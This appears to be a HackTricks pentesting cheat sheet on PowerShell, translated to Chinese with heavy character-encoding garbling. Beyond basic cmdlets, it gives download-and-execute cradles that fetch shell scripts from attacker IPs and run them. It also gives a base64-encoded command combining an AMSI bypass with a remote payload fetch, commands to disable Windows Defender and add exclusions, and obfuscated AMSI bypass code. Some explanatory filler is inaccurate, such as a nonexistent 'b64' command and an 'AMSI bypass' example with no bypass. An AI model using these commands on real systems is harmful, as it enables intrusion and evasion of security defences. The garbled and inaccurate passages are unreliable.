# åŸºæœ¬çš„PowerShellæŠ€å·§

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘å¹³å° â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitchç›´æ’­ ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTubeé¢‘é“ ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**hacktricksä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloudä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## é»˜è®¤çš„PowerShellä½ç½®
```powershell
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell
```
## å¼€å§‹çš„åŸºæœ¬PSå‘½ä»¤

PowerShell (PS) æ˜¯ä¸€ç§åŠŸèƒ½å¼ºå¤§çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºåœ¨Windowsç³»ç»Ÿä¸Šæ‰§è¡Œå„ç§ä»»åŠ¡ã€‚å¯¹äºæ¸—é€æµ‹è¯•äººå‘˜æ¥è¯´ï¼Œç†Ÿæ‚‰ä¸€äº›åŸºæœ¬çš„PSå‘½ä»¤æ˜¯éå¸¸é‡è¦çš„ã€‚ä¸‹é¢æ˜¯ä¸€äº›å¸¸ç”¨çš„åŸºæœ¬PSå‘½ä»¤ï¼š

### è·å–å½“å‰ç›®å½•

```powershell
Get-Location
```

æ­¤å‘½ä»¤ç”¨äºè·å–å½“å‰æ‰€åœ¨çš„ç›®å½•ã€‚

### åˆ‡æ¢ç›®å½•

```powershell
Set-Location <ç›®å½•è·¯å¾„>
```

ä½¿ç”¨æ­¤å‘½ä»¤å¯ä»¥åˆ‡æ¢åˆ°æŒ‡å®šçš„ç›®å½•ã€‚

### åˆ—å‡ºç›®å½•å†…å®¹

```powershell
Get-ChildItem
```

ä½¿ç”¨æ­¤å‘½ä»¤å¯ä»¥åˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶å’Œå­ç›®å½•ã€‚

### åˆ›å»ºæ–°ç›®å½•

```powershell
New-Item -ItemType Directory -Path <ç›®å½•è·¯å¾„>
```

ä½¿ç”¨æ­¤å‘½ä»¤å¯ä»¥åœ¨æŒ‡å®šè·¯å¾„ä¸‹åˆ›å»ºæ–°çš„ç›®å½•ã€‚

### å¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•

```powershell
Copy-Item -Path <æºè·¯å¾„> -Destination <ç›®æ ‡è·¯å¾„>
```

ä½¿ç”¨æ­¤å‘½ä»¤å¯ä»¥å¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•åˆ°æŒ‡å®šçš„ç›®æ ‡è·¯å¾„ã€‚

### ç§»åŠ¨æ–‡ä»¶æˆ–ç›®å½•

```powershell
Move-Item -Path <æºè·¯å¾„> -Destination <ç›®æ ‡è·¯å¾„>
```

ä½¿ç”¨æ­¤å‘½ä»¤å¯ä»¥å°†æ–‡ä»¶æˆ–ç›®å½•ç§»åŠ¨åˆ°æŒ‡å®šçš„ç›®æ ‡è·¯å¾„ã€‚

### åˆ é™¤æ–‡ä»¶æˆ–ç›®å½•

```powershell
Remove-Item -Path <è·¯å¾„> -Recurse
```

ä½¿ç”¨æ­¤å‘½ä»¤å¯ä»¥åˆ é™¤æŒ‡å®šçš„æ–‡ä»¶æˆ–ç›®å½•ã€‚ä½¿ç”¨ `-Recurse` å‚æ•°å¯ä»¥åˆ é™¤ç›®å½•åŠå…¶å†…å®¹ã€‚

### æ˜¾ç¤ºæ–‡ä»¶å†…å®¹

```powershell
Get-Content <æ–‡ä»¶è·¯å¾„>
```

ä½¿ç”¨æ­¤å‘½ä»¤å¯ä»¥æ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶çš„å†…å®¹ã€‚

### ç¼–è¾‘æ–‡ä»¶

```powershell
Set-Content -Path <æ–‡ä»¶è·¯å¾„> -Value <å†…å®¹>
```

ä½¿ç”¨æ­¤å‘½ä»¤å¯ä»¥ç¼–è¾‘æŒ‡å®šæ–‡ä»¶çš„å†…å®¹ã€‚

### è¿è¡Œè„šæœ¬

```powershell
.\<è„šæœ¬æ–‡ä»¶å>.ps1
```

ä½¿ç”¨æ­¤å‘½ä»¤å¯ä»¥è¿è¡ŒæŒ‡å®šçš„PowerShellè„šæœ¬æ–‡ä»¶ã€‚

ä»¥ä¸Šæ˜¯ä¸€äº›åŸºæœ¬çš„PSå‘½ä»¤ï¼Œå®ƒä»¬å¯ä»¥å¸®åŠ©æ¸—é€æµ‹è¯•äººå‘˜åœ¨Windowsç³»ç»Ÿä¸Šæ‰§è¡Œå„ç§ä»»åŠ¡ã€‚ç†Ÿç»ƒæŒæ¡è¿™äº›å‘½ä»¤å°†æé«˜ä½ çš„å·¥ä½œæ•ˆç‡å¹¶åŠ å¼ºä½ çš„æŠ€èƒ½ã€‚
```powershell
Get-Help * #List everything loaded
Get-Help process #List everything containing "process"
Get-Help Get-Item -Full #Get full helpabout a topic
Get-Help Get-Item -Examples #List examples
Import-Module <modulepath>
Get-Command -Module <modulename>
```
## ä¸‹è½½å’Œæ‰§è¡Œ

To download and execute a file using PowerShell, you can use the following command:

```powershell
Invoke-WebRequest -Uri <URL> -OutFile <OutputFile>; .\<OutputFile>
```

Replace `<URL>` with the URL of the file you want to download, and `<OutputFile>` with the desired name of the downloaded file.

ä½¿ç”¨PowerShellä¸‹è½½å’Œæ‰§è¡Œæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
Invoke-WebRequest -Uri <URL> -OutFile <OutputFile>; .\<OutputFile>
```

å°†`<URL>`æ›¿æ¢ä¸ºè¦ä¸‹è½½çš„æ–‡ä»¶çš„URLï¼Œå°†`<OutputFile>`æ›¿æ¢ä¸ºä¸‹è½½æ–‡ä»¶çš„æ‰€éœ€åç§°ã€‚

This command uses the `Invoke-WebRequest` cmdlet to download the file from the specified URL and save it to the local system. The `-OutFile` parameter specifies the name of the output file.

è¯¥å‘½ä»¤ä½¿ç”¨`Invoke-WebRequest`å‘½ä»¤æ¥ä»æŒ‡å®šçš„URLä¸‹è½½æ–‡ä»¶å¹¶ä¿å­˜åˆ°æœ¬åœ°ç³»ç»Ÿã€‚`-OutFile`å‚æ•°æŒ‡å®šè¾“å‡ºæ–‡ä»¶çš„åç§°ã€‚

After the file is downloaded, the second part of the command (`.<OutputFile>`) executes the downloaded file.

æ–‡ä»¶ä¸‹è½½å®Œæˆåï¼Œå‘½ä»¤çš„ç¬¬äºŒéƒ¨åˆ†ï¼ˆ`.<OutputFile>`ï¼‰æ‰§è¡Œä¸‹è½½çš„æ–‡ä»¶ã€‚

This technique can be used to download and execute malicious files on a target system, so it should be used responsibly and only for legitimate purposes.

è¿™ç§æŠ€æœ¯å¯ä»¥ç”¨äºåœ¨ç›®æ ‡ç³»ç»Ÿä¸Šä¸‹è½½å’Œæ‰§è¡Œæ¶æ„æ–‡ä»¶ï¼Œå› æ­¤åº”è¯¥è´Ÿè´£ä»»åœ°ä½¿ç”¨ï¼Œå¹¶ä¸”ä»…é™äºåˆæ³•ç›®çš„ã€‚
```powershell
g
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile - #From cmd download and execute
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
iex (iwr '10.10.14.9:8000/ipw.ps1') #From PSv3

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.9:8000/ipw.ps1',$false);$h.send();iex $h.responseText
$wr = [System.NET.WebRequest]::Create("http://10.10.14.9:8000/ipw.ps1") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd(

#https://twitter.com/Alh4zr3d/status/1566489367232651264
#host a text record with your payload at one of your (unburned) domains and do this:
powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]
```
### ä½¿ç”¨ AMSI Bypass åå°ä¸‹è½½å’Œæ‰§è¡Œ

This technique allows you to download and execute a file in the background while bypassing AMSI (Antimalware Scan Interface).

#### Usage

```powershell
Invoke-WebRequest -Uri "http://example.com/file.exe" -OutFile "C:\path\to\file.exe"
Start-Process -FilePath "C:\path\to\file.exe" -WindowStyle Hidden
```

Replace `"http://example.com/file.exe"` with the URL of the file you want to download, and `"C:\path\to\file.exe"` with the desired path and filename for the downloaded file.

#### Explanation

1. The `Invoke-WebRequest` cmdlet is used to download the file from the specified URL and save it to the specified path.
2. The `Start-Process` cmdlet is used to execute the downloaded file in the background with a hidden window style.

By using this technique, you can download and execute a file without triggering any antivirus alerts that may be monitoring PowerShell commands. The AMSI bypass helps to evade detection by bypassing the antimalware scanning interface.
```powershell
Start-Process -NoNewWindow powershell "-nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA="
```
### åœ¨Linuxä¸­ä½¿ç”¨b64

The `b64` command in Linux is a useful tool for encoding and decoding data in Base64 format. It can be used to convert binary data into a text format that is easily readable and transferable.

To encode a file using `b64`, you can use the following command:

```bash
b64 -e <input_file> > <output_file>
```

Replace `<input_file>` with the path to the file you want to encode, and `<output_file>` with the desired name and location for the encoded file.

To decode a file using `b64`, you can use the following command:

```bash
b64 -d <input_file> > <output_file>
```

Replace `<input_file>` with the path to the file you want to decode, and `<output_file>` with the desired name and location for the decoded file.

Using the `b64` command in Linux can be helpful in various scenarios, such as encoding sensitive data for secure transmission or decoding encoded files received during a penetration test.
```powershell
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
```
## ä¸‹è½½

### System.Net.WebClient

æ‚¨å¯ä»¥ä½¿ç”¨`System.Net.WebClient`ç±»æ¥ä¸‹è½½æ–‡ä»¶ã€‚ä»¥ä¸‹æ˜¯ä½¿ç”¨`DownloadFile`æ–¹æ³•ä¸‹è½½æ–‡ä»¶çš„ç¤ºä¾‹ä»£ç ï¼š

```powershell
$webClient = New-Object System.Net.WebClient
$url = "https://example.com/file.txt"
$destination = "C:\path\to\save\file.txt"
$webClient.DownloadFile($url, $destination)
```

åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ª`System.Net.WebClient`å¯¹è±¡ï¼Œå¹¶æŒ‡å®šäº†è¦ä¸‹è½½çš„æ–‡ä»¶çš„URLå’Œä¿å­˜æ–‡ä»¶çš„ç›®æ ‡è·¯å¾„ã€‚ç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨`DownloadFile`æ–¹æ³•å°†æ–‡ä»¶ä¸‹è½½åˆ°æŒ‡å®šçš„ç›®æ ‡è·¯å¾„ã€‚

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨`DownloadFileAsync`æ–¹æ³•æ¥å¼‚æ­¥ä¸‹è½½æ–‡ä»¶ã€‚ä»¥ä¸‹æ˜¯ä½¿ç”¨`DownloadFileAsync`æ–¹æ³•ä¸‹è½½æ–‡ä»¶çš„ç¤ºä¾‹ä»£ç ï¼š

```powershell
$webClient = New-Object System.Net.WebClient
$url = "https://example.com/file.txt"
$destination = "C:\path\to\save\file.txt"
$webClient.DownloadFileAsync($url, $destination)
```

ä½¿ç”¨`DownloadFileAsync`æ–¹æ³•ä¸‹è½½æ–‡ä»¶æ—¶ï¼Œä¸‹è½½æ“ä½œå°†åœ¨åå°è¿›è¡Œï¼Œä¸ä¼šé˜»å¡å½“å‰çº¿ç¨‹ã€‚

è¯·æ³¨æ„ï¼Œä¸‹è½½æ–‡ä»¶æ—¶éœ€è¦ç¡®ä¿ç›®æ ‡è·¯å¾„æ˜¯æœ‰æ•ˆçš„ï¼Œå¹¶ä¸”å…·æœ‰è¶³å¤Ÿçš„æƒé™æ¥ä¿å­˜æ–‡ä»¶ã€‚
```powershell
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
```
### è°ƒç”¨-ç½‘ç»œè¯·æ±‚

`Invoke-WebRequest` æ˜¯ PowerShell ä¸­çš„ä¸€ä¸ªå‘½ä»¤ï¼Œç”¨äºå‘é€ HTTP æˆ– HTTPS è¯·æ±‚å¹¶è·å–å“åº”ã€‚å®ƒå¯ä»¥ç”¨äºåœ¨æ¸—é€æµ‹è¯•ä¸­æ‰§è¡Œå„ç§ç½‘ç»œæ“ä½œï¼Œå¦‚è·å–ç½‘é¡µå†…å®¹ã€æäº¤è¡¨å•æ•°æ®ç­‰ã€‚

#### è¯­æ³•

```powershell
Invoke-WebRequest [-Uri] <string> [-Method <string>] [-Headers <hashtable>] [-Body <string>] [-ContentType <string>] [-UserAgent <string>] [-Proxy <Uri>] [-ProxyCredential <PSCredential>] [-TimeoutSec <int>] [-SessionVariable <string>] [-UseBasicParsing] [<CommonParameters>]
```

#### å‚æ•°

- `-Uri`ï¼šæŒ‡å®šè¦è¯·æ±‚çš„ URLã€‚
- `-Method`ï¼šæŒ‡å®šè¯·æ±‚çš„æ–¹æ³•ï¼Œå¦‚ GETã€POST ç­‰ï¼Œé»˜è®¤ä¸º GETã€‚
- `-Headers`ï¼šæŒ‡å®šè¯·æ±‚çš„å¤´éƒ¨ä¿¡æ¯ã€‚
- `-Body`ï¼šæŒ‡å®šè¯·æ±‚çš„ä¸»ä½“å†…å®¹ã€‚
- `-ContentType`ï¼šæŒ‡å®šè¯·æ±‚çš„å†…å®¹ç±»å‹ã€‚
- `-UserAgent`ï¼šæŒ‡å®šè¯·æ±‚çš„ç”¨æˆ·ä»£ç†ã€‚
- `-Proxy`ï¼šæŒ‡å®šè¯·æ±‚çš„ä»£ç†æœåŠ¡å™¨ã€‚
- `-ProxyCredential`ï¼šæŒ‡å®šä»£ç†æœåŠ¡å™¨çš„å‡­æ®ã€‚
- `-TimeoutSec`ï¼šæŒ‡å®šè¯·æ±‚çš„è¶…æ—¶æ—¶é—´ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ã€‚
- `-SessionVariable`ï¼šæŒ‡å®šå°†å“åº”ä¿å­˜åˆ°çš„ä¼šè¯å˜é‡ã€‚
- `-UseBasicParsing`ï¼šä½¿ç”¨åŸºæœ¬è§£æå™¨æ¥è§£æ HTML å“åº”ã€‚

#### ç¤ºä¾‹

ä»¥ä¸‹ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨ `Invoke-WebRequest` å‘é€ HTTP è¯·æ±‚å¹¶è·å–å“åº”ï¼š

```powershell
$response = Invoke-WebRequest -Uri "https://www.example.com"
$response.Content
```

è¿™å°†å‘é€ä¸€ä¸ª GET è¯·æ±‚åˆ° `https://www.example.com` å¹¶å°†å“åº”å†…å®¹æ‰“å°åˆ°æ§åˆ¶å°ã€‚

#### æ³¨æ„äº‹é¡¹

- åœ¨ä½¿ç”¨ `Invoke-WebRequest` æ—¶ï¼Œè¯·ç¡®ä¿å·²è·å¾—åˆæ³•æˆæƒï¼Œå¹¶éµå®ˆé€‚ç”¨çš„æ³•å¾‹æ³•è§„ã€‚
- åœ¨æ¸—é€æµ‹è¯•ä¸­ä½¿ç”¨ `Invoke-WebRequest` æ—¶ï¼Œåº”è°¨æ…å¤„ç†æ•æ„Ÿä¿¡æ¯ï¼Œä»¥å…é€ æˆä¸å¿…è¦çš„æŸå¤±ã€‚
```powershell
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
```
### Wget

Wget is a command-line utility that allows you to download files from the web. It supports downloading files using various protocols such as HTTP, HTTPS, and FTP. Wget is available for multiple operating systems, including Windows.

To use Wget, open a command prompt and navigate to the directory where you want to save the downloaded file. Then, enter the following command:

```
wget [URL]
```

Replace `[URL]` with the URL of the file you want to download. Wget will retrieve the file and save it to the current directory.

You can also specify a different name for the downloaded file by using the `-O` option followed by the desired filename. For example:

```
wget -O myfile.txt [URL]
```

This will download the file from the specified URL and save it as `myfile.txt` in the current directory.

Wget also supports resuming interrupted downloads using the `-c` option. If a download is interrupted, you can resume it by running the same `wget` command again with the `-c` option.

In addition to downloading files, Wget can also be used to mirror entire websites, recursively download directories, and perform other advanced operations. Refer to the Wget documentation for more information on these features.

**Note:** When using Wget for any unauthorized activities, such as downloading copyrighted material without permission, you may be violating the law. Always ensure that you have the necessary rights and permissions before downloading any files.
```powershell
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
```
### BitsTransfer

BitsTransfer æ˜¯ä¸€ç§åœ¨ PowerShell ä¸­ä½¿ç”¨çš„å·¥å…·ï¼Œç”¨äºåœ¨è®¡ç®—æœºä¹‹é—´ä¼ è¾“æ–‡ä»¶ã€‚å®ƒå¯ä»¥å¸®åŠ©æ¸—é€æµ‹è¯•äººå‘˜åœ¨æ‰§è¡Œæ”»å‡»æ—¶å¿«é€Ÿã€é«˜æ•ˆåœ°ä¼ è¾“æ–‡ä»¶ã€‚

BitsTransfer æä¾›äº†ä¸€ç§ç®€å•çš„æ–¹æ³•æ¥ä¸‹è½½å’Œä¸Šä¼ æ–‡ä»¶ï¼Œè€Œæ— éœ€ç¼–å†™å¤æ‚çš„ä»£ç ã€‚å®ƒä½¿ç”¨åå°ä»»åŠ¡æ¥å¤„ç†æ–‡ä»¶ä¼ è¾“ï¼Œå› æ­¤å¯ä»¥åœ¨åå°è¿è¡Œï¼Œè€Œä¸ä¼šå¹²æ‰°æ¸—é€æµ‹è¯•äººå‘˜çš„å…¶ä»–æ“ä½œã€‚

ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„ BitsTransfer å‘½ä»¤ï¼š

- `Start-BitsTransfer`ï¼šå¯åŠ¨æ–‡ä»¶ä¼ è¾“ä»»åŠ¡ã€‚
- `Get-BitsTransfer`ï¼šè·å–å½“å‰æ­£åœ¨è¿è¡Œçš„æ–‡ä»¶ä¼ è¾“ä»»åŠ¡çš„çŠ¶æ€ã€‚
- `Complete-BitsTransfer`ï¼šå®Œæˆæ–‡ä»¶ä¼ è¾“ä»»åŠ¡ã€‚
- `Remove-BitsTransfer`ï¼šç§»é™¤æ–‡ä»¶ä¼ è¾“ä»»åŠ¡ã€‚

æ¸—é€æµ‹è¯•äººå‘˜å¯ä»¥ä½¿ç”¨ BitsTransfer æ¥ä¸‹è½½æˆ–ä¸Šä¼ æ–‡ä»¶ï¼Œä»¥ä¾¿åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œæ”»å‡»ã€‚è¿™å¯ä»¥å¸®åŠ©ä»–ä»¬åœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­è·å–æ‰€éœ€çš„å·¥å…·ã€è„šæœ¬æˆ–å…¶ä»–æ–‡ä»¶ã€‚

è¯·æ³¨æ„ï¼Œæ¸—é€æµ‹è¯•äººå‘˜åº”è¯¥å§‹ç»ˆéµå®ˆæ³•å¾‹å’Œé“å¾·å‡†åˆ™ï¼Œå¹¶è·å¾—é€‚å½“çš„æˆæƒæ‰èƒ½æ‰§è¡Œä»»ä½•æ”»å‡»è¡Œä¸ºã€‚
```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
# OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
## Base64 Kali & EncodedCommand

### Base64 Kali

åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤ã€‚ä¸ºäº†é¿å…åœ¨ç½‘ç»œä¸Šä¼ è¾“æ˜æ–‡å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Base64ç¼–ç æ¥å¯¹å‘½ä»¤è¿›è¡Œç¼–ç ã€‚Kali Linuxæä¾›äº†ä¸€ä¸ªæ–¹ä¾¿çš„æ–¹æ³•æ¥æ‰§è¡ŒBase64ç¼–ç å’Œè§£ç ã€‚

è¦å¯¹å‘½ä»¤è¿›è¡ŒBase64ç¼–ç ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```bash
echo -n "command" | base64
```

è¦å¯¹Base64ç¼–ç è¿›è¡Œè§£ç ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```bash
echo -n "base64_encoded_command" | base64 -d
```

### EncodedCommand

åœ¨Windowsæ¸—é€æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡ŒPowerShellå‘½ä»¤ã€‚ç„¶è€Œï¼Œç”±äºå‘½ä»¤ä¸­å¯èƒ½åŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼Œç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­æ‰§è¡Œå¯èƒ½ä¼šå¯¼è‡´é”™è¯¯ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨`EncodedCommand`å‚æ•°æ¥æ‰§è¡Œç»è¿‡ç¼–ç çš„PowerShellå‘½ä»¤ã€‚

è¦ç”Ÿæˆç»è¿‡ç¼–ç çš„PowerShellå‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
$command = "command"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
```

ç„¶åï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œç»è¿‡ç¼–ç çš„PowerShellå‘½ä»¤ï¼š

```powershell
powershell.exe -EncodedCommand encoded_command
```

è¯·æ³¨æ„ï¼Œ`EncodedCommand`å‚æ•°åªèƒ½åœ¨å‘½ä»¤è¡Œä¸­ä½¿ç”¨ï¼Œè€Œä¸èƒ½åœ¨PowerShellè„šæœ¬ä¸­ä½¿ç”¨ã€‚

ä½¿ç”¨Base64ç¼–ç å’Œ`EncodedCommand`å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ¸—é€æµ‹è¯•ä¸­æ›´å®‰å…¨åœ°æ‰§è¡Œå‘½ä»¤ï¼ŒåŒæ—¶é¿å…äº†ç‰¹æ®Šå­—ç¬¦å¸¦æ¥çš„é—®é¢˜ã€‚
```powershell
kali> echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
PS> powershell -EncodedCommand <Base64>
```
## [æ‰§è¡Œç­–ç•¥](../authentication-credentials-uac-and-efs.md#ps-execution-policy)

## [å—é™è¯­è¨€](broken-reference/)

## [AppLockerç­–ç•¥](broken-reference/)

## å¯ç”¨WinRMï¼ˆè¿œç¨‹PSï¼‰
```powershell
enable-psremoting -force #This enables winrm

# Change NetWorkConnection Category to Private
#Requires -RunasAdministrator

Get-NetConnectionProfile |
Where{ $_.NetWorkCategory -ne 'Private'} |
ForEach {
$_
$_|Set-NetConnectionProfile -NetWorkCategory Private -Confirm
}
```
## ç¦ç”¨Defender

{% code overflow="wrap" %}
```powershell
# Check status
Get-MpComputerStatus
Get-MpPreference | select Exclusion* | fl #Check exclusions
# Disable
Set-MpPreference -DisableRealtimeMonitoring $true
#To completely disable Windows Defender on a computer, use the command:
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
# Set exclusion path
Set-MpPreference -ExclusionPath (pwd) -disablerealtimemonitoring
Add-MpPreference -ExclusionPath (pwd)

# Check exclusions configured via GPO
Parse-PolFile .\Registry.pol

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions
ValueName : Exclusions_Paths
ValueType : REG_DWORD
ValueLength : 4
ValueData : 1

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths
ValueName : C:\Windows\Temp
ValueType : REG_SZ
ValueLength : 4
ValueData : 0
```
{% endcode %}

### AMSIç»•è¿‡

**`amsi.dll`** è¢«**åŠ è½½**åˆ°ä½ çš„è¿›ç¨‹ä¸­ï¼Œå¹¶ä¸”å…·æœ‰ä¸ä»»ä½•åº”ç”¨ç¨‹åºè¿›è¡Œäº¤äº’æ‰€éœ€çš„**å¯¼å‡ºå‡½æ•°**ã€‚ç”±äºå®ƒè¢«åŠ è½½åˆ°ä½ æ‰€**æ§åˆ¶çš„è¿›ç¨‹çš„å†…å­˜ç©ºé—´**ä¸­ï¼Œä½ å¯ä»¥é€šè¿‡**è¦†ç›–å†…å­˜ä¸­çš„æŒ‡ä»¤**æ¥æ”¹å˜å®ƒçš„è¡Œä¸ºï¼Œä½¿å…¶æ— æ³•æ£€æµ‹åˆ°ä»»ä½•ä¸œè¥¿ã€‚

å› æ­¤ï¼Œä½ çš„ç›®æ ‡æ˜¯é€šè¿‡åœ¨å†…å­˜ä¸­**è¦†ç›–è¯¥DLLçš„æŒ‡ä»¤**ï¼Œä½¿æ£€æµ‹å˜å¾—æ— æ•ˆã€‚

**AMSIç»•è¿‡ç”Ÿæˆå™¨**ç½‘é¡µï¼š[**https://amsi.fail/**](https://amsi.fail/)
```powershell
# A Method
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)

# Another: from https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI_bypass_2021_09.ps1
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " " ).
GetField([string](38..51|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " ",'NonPublic,Static').
SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
